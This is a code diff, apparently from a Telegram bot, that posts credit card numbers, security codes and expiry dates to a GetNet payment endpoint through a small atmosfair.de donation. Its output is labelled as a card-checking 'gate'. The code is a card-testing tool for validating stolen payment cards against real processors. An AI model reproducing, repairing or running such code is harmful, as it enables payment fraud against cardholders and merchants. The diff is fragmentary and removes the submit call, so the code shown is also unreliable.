@@ -139,7 +139,7 @@ async def sa(Client, message):
 'Sec-Fetch-Site':'same-origin',
 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'}
                                 data = '{"amount":6,"parentUrl":"https://www.atmosfair.de/","persistCreditCard":true}'
-                                req = res.post(url, data=data , headers=headers)
+                                req = requests.post(url, data=data , headers=headers)
                                 json_text = json.loads(req.text)
                                 if 'url' not in json_text:
                                     text = f"""
@@ -174,7 +174,6 @@ async def sa(Client, message):
 'X-Requested-With':'XMLHttpRequest',
 }
                                     data = '{"periodic":{"sequence-type":"first","periodic-type":"recurring"},"card":{"account-number":"' + cc +'","card-security-code":" ' + cvv + '","card-type":"visa","card-type-selection":"default","expiration-month":"' + mes + '","expiration-year":"' + ano +'"},"account-holder":{"first-name":"' + first_name + '","last-name":"' + last_name + '"},"locale":"en","payment-methods":[{"name":"creditcard"}],"browser":{"screen-resolution":"1366x768","color-depth":24,"timezone":-330,"java-enabled":"false","language":"en-IN"}}'
-                                    res = res.post("https://paymentpage.getneteurope.com/api/payment/submit",headers=headers,data=data)
                                     text = f"""
 <b>〄</b> GATE: <b>GETNET 6€</b>
 <b>ᗚ</b> INPUT: <code>{lista}</code>
